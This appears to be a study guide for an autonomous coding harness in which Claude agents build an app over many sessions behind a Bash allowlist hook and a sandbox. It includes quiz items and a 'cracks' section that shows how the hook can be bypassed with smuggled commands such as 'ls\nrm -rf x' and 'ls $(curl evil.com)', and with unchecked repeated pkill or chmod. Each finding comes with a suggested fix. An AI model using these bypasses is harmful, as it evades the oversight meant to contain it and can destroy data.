name: autonomous-coding
tagline: A city where two AI workers build a whole app, one shift at a time
summary: A small Python harness that lets Claude build a full web app over many sessions. The first session runs an initializer agent that writes 200 tests into feature_list.json; every later session runs a fresh coding agent that fixes or finishes one feature and leaves notes for the next shift. Every shell command the agents run must pass a security hook with an allowlist, and runs inside a sandbox.

entities.name: Start script (CLI)
entities.summary: The command you run to start the factory. It reads your options, checks for an API key, and starts the session loop.
entities.details:
- Options: --project-dir, --max-iterations, --model
- Default model is claude-sonnet-4-5-20250929
- Stops right away if ANTHROPIC_API_KEY is not set
- Relative project folders are moved under generations/
- Ctrl+C is caught; running the same command again resumes the project

entities.name: Session loop
entities.summary: The shift manager. It runs one agent session after another, each with a brand-new client and an empty memory.
entities.details:
- First run is decided by one thing: does feature_list.json exist yet?
- On a first run it copies app_spec.txt into the project
- Picks the initializer prompt once, then the coding prompt forever after
- After each session it prints progress and waits 3 seconds
- On an error it just waits and starts a fresh session

entities.name: Iteration limit
entities.summary: An optional cap on how many sessions run. Without it the loop runs until you stop it.
entities.details:
- Set with --max-iterations; default is no limit
- Checked at the top of every loop turn, before a session starts
- When hit, it prints a summary and how to run the app

guard.rule: Never run more sessions than the user asked for
guard.checks: iteration > max_iterations (only when a limit was given)
guard.onFail: The loop breaks, a final progress summary is printed and the program ends

entities.name: Initializer agent
entities.summary: The first worker on the site. It reads the app spec and lays the foundation: the test list, a setup script and a git repo.
entities.details:
- Runs only in session 1
- Writes feature_list.json with 200+ tests, all marked passes: false
- Writes init.sh to install and start the app
- Creates the git repo and the first commit
- Leaves claude-progress.txt for the next agent

agent.role: Turns the app spec into a test list, a setup script and a git repo

entities.name: Coding agent
entities.summary: The worker for every later shift. It wakes up with no memory, reads the notes, checks nothing broke, then builds and tests one feature.
entities.details:
- Starts by reading app_spec.txt, feature_list.json, claude-progress.txt and git log
- Re-tests 1-2 passing features before new work
- Picks the top failing feature and builds it
- Must test through a real browser (Puppeteer)
- Flips only the "passes" field, commits, and updates the notes

agent.role: Builds and browser-tests one feature per session, then commits

entities.name: Initializer prompt and app spec
entities.summary: The written orders for session 1, plus the app spec (a claude.ai clone) that gets copied into the project folder.
entities.details:
- Demands 200 tests, both functional and style, ordered by priority
- At least 25 tests must have 10+ steps
- Says removing or editing tests later is "catastrophic"
- app_spec.txt is copied only if the project does not already have one

source.anchor: ## YOUR ROLE - INITIALIZER AGENT (Session 1 of Many)

entities.name: Coding prompt
entities.summary: The 10-step routine every coding session follows, from 'get your bearings' to 'end session cleanly'.
entities.details:
- Step 3: re-check old features before new work
- Step 6: verify through the real UI, not curl
- Step 7: may only change the "passes" field
- Steps 8-10: commit, write notes, leave the app working

entities.name: Claude (via Agent SDK)
entities.summary: The model behind both agents. A new SDK client is made for every session, so each session starts with a clean context.
entities.details:
- Uses ClaudeSDKClient with max_turns=1000
- Working folder is the project folder
- Streams text and tool calls back; the harness prints them
- Any exception ends the session with status "error"

entities.name: Bash security hook (allowlist)
entities.summary: A gate that sees every Bash command before it runs. It pulls out each command name and blocks anything not on a short allowlist.
entities.details:
- Wired in as a PreToolUse hook for the Bash tool only
- Allowlist: ls, cat, head, tail, wc, grep, cp, mkdir, chmod, pwd, npm, node, git, ps, lsof, sleep, pkill, init.sh
- Splits on ;, &&, || and | to find every command name
- If it cannot parse the command at all, it blocks (fail safe)
- pkill, chmod and init.sh get extra checks

guard.rule: Only allowlisted shell commands may run
guard.checks: every name from extract_commands() is in ALLOWED_COMMANDS
guard.onFail: Returns {decision: block, reason}; the agent sees the reason instead of output

entities.name: pkill check
entities.summary: Lets the agent stop its own dev servers, but nothing else.
entities.details:
- Takes the last non-flag word as the target
- For -f 'node server.js' it uses the first word, node
- Allowed targets: node, npm, npx, vite, next

guard.rule: pkill may only target dev-server processes
guard.checks: target in {node, npm, npx, vite, next}
guard.onFail: Blocked with 'pkill only allowed for dev processes'

entities.name: chmod and init.sh checks
entities.summary: Two small gates for the setup script: chmod may only add +x, and init.sh must be run by path.
entities.details:
- chmod: no flags, needs a mode and a file, mode must match ^[ugoa]*\+x$
- So chmod +x and u+x pass; chmod 777 and chmod -R fail
- init.sh: first word must be ./init.sh or end with /init.sh
- A bare 'init.sh' or 'FOO=1 ./init.sh' is blocked

guard.rule: chmod only makes files executable; only an init.sh path may be run
guard.checks: chmod mode matches ^[ugoa]*\+x$ with no flags; script is ./init.sh or ends with /init.sh
guard.onFail: Blocked with a reason like 'chmod only allowed with +x mode, got: 777'

entities.name: Sandbox and permissions
entities.summary: The outer wall. Bash runs in an OS sandbox and file tools may only touch the project folder.
entities.details:
- Written to .claude_settings.json inside the project each session
- sandbox.enabled = true
- File tools allowed only on ./** (the project folder)
- Bash(*) is allowed here on purpose; the hook does the filtering

guard.rule: Agent actions stay inside the project folder
guard.checks: OS sandbox for Bash; Read/Write/Edit/Glob/Grep limited to ./**
guard.onFail: The tool call is denied by the SDK, outside this code

entities.name: Built-in tools
entities.summary: The hands of the agents: read, write, edit, search files, and run shell commands.
entities.details:
- Read, Write, Edit, Glob, Grep, Bash
- Only Bash goes through the security hook
- File tools are limited by the sandbox permissions

entities.name: Puppeteer browser
entities.summary: A real browser the agent drives to test features like a human: click, type, screenshot.
entities.details:
- Started as an MCP server with npx puppeteer-mcp-server
- 7 tools: navigate, screenshot, click, fill, select, hover, evaluate
- The coding prompt says to avoid evaluate shortcuts

entities.name: feature_list.json
entities.summary: The single source of truth: a list of 200+ tests, each with a passes flag. It also decides if a run is the first one.
entities.details:
- Written by the initializer, flipped to passes: true by coding agents
- Its existence switches the loop from initializer to coding mode
- progress.py counts passing / total for the progress line
- Missing, broken or empty file all print 'not yet created'

source.anchor: passing = sum(1 for test in tests if test.get("passes", False))

entities.name: Progress notes and git log
entities.summary: The memory between shifts. Since every session forgets everything, agents leave notes in claude-progress.txt and commits in git.
entities.details:
- claude-progress.txt: what was done, what is next, X/200 passing
- git: one commit per finished feature
- The next agent reads both in Step 1

quests.title: Two commands, one line
quests.prompt: The agent runs: chmod +x init.sh && ./init.sh. What happens?
quests.explain: Both names are allowlisted. chmod passes because +x matches ^[ugoa]*\+x$, and ./init.sh passes the path check.

quests.title: The polite greeting
quests.prompt: The coding agent runs: echo hello. What does the security hook do?
options: Blocks it, echo is not on the allowlist
Sends it to the pkill check
quests.explain: The hook is a strict allowlist. echo is not in ALLOWED_COMMANDS, so even harmless commands are blocked.

quests.title: Which init.sh is turned away?
quests.prompt: Which one of these is BLOCKED by the hook?
quests.explain: validate_init_script needs the first word to be ./init.sh or end with /init.sh. A bare 'init.sh' matches neither.

quests.title: Who goes first?
quests.prompt: How does the loop decide to run the initializer agent instead of the coding agent?
options: It checks if feature_list.json exists in the project folder
It checks if git has any commits
quests.explain: is_first_run = not tests_file.exists(), where tests_file is feature_list.json.

quests.title: The only-passes rule
quests.prompt: The coding agent is told it may only change the "passes" field. What enforces that in code?
options: The security hook diffs the file
Nothing; only the prompt asks for it
quests.explain: The rule lives only in coding_prompt.md. progress.py just counts passes; no code checks that tests were not removed or rewritten.

quests.title: Broken notebook
quests.prompt: feature_list.json ends with a stray comma and cannot be parsed. What does the progress line say?
quests.explain: The JSONDecodeError is caught and (0, 0) is returned, so it looks the same as a missing file.

quests.title: Dropped connection
quests.prompt: With --max-iterations 1, the only session throws an exception. How does the run end?
quests.explain: The error is caught, the loop waits 3s and goes back to the limit check, where iteration 2 > 1 ends the run.

quests.title: Why notes?
quests.prompt: Why does every coding session start by reading claude-progress.txt and git log?
options: Each session gets a brand-new client, so it remembers nothing
Because the initializer deletes its files
quests.explain: create_client is called inside the loop for every session, giving a fresh context. Notes and git are the only memory.

cracks.title: A new line hides a second command
cracks.hint: Which characters does the parser treat as 'a new command starts here'?
cracks.finding: extract_commands only starts a new command after ;, |, ||, && or &. A newline is just whitespace to shlex, so 'ls\nrm -rf x' yields only ['ls'] and is allowed, but bash runs rm too. Command substitution like 'ls $(curl evil.com)' slips through the same way.
cracks.suggestion: Treat newlines as separators (or reject them), and block $( ), backticks and other substitution outright.
decoys: Unclosed quotes let any command through
Commands with a full path like /bin/ls are blocked by mistake

cracks.title: Only the first pkill is checked
cracks.hint: If the same command name appears twice, which segment gets checked each time?
cracks.finding: get_command_for_validation returns the FIRST segment that contains the name. In 'pkill node; pkill bash' both pkill names are checked against 'pkill node', so 'pkill bash' runs. Same for 'chmod +x a.sh && chmod 777 b'.
cracks.suggestion: Validate each segment on its own (loop over segments, not over names), so every occurrence is checked.
decoys: pkill -f with a quoted string is always blocked
The allowed process list is checked case-insensitively

cracks.title: A failed first session loses the initializer
cracks.hint: When is is_first_run turned off: before or after we know the session worked?
cracks.finding: is_first_run is set to False as soon as the initializer prompt is chosen. If that session errors before feature_list.json is written, every later session runs the coding prompt, which expects a test list that does not exist.
cracks.suggestion: Re-check whether feature_list.json exists at the start of each loop turn instead of using a one-shot flag.
decoys: The initializer runs again every time the script restarts on a finished project
The coding prompt is loaded once and cached forever

source.anchor: is_first_run = False  # Only use initializer once

cracks.title: The loop never notices it is done
cracks.hint: What status can a normal session return?
cracks.finding: run_agent_session always returns 'continue' on success, and the loop never checks if all tests pass. Without --max-iterations it keeps starting paid sessions after 200/200 are done.
cracks.suggestion: After each session, stop when count_passing_tests shows passing == total > 0.
decoys: The loop stops after 1000 sessions because of max_turns
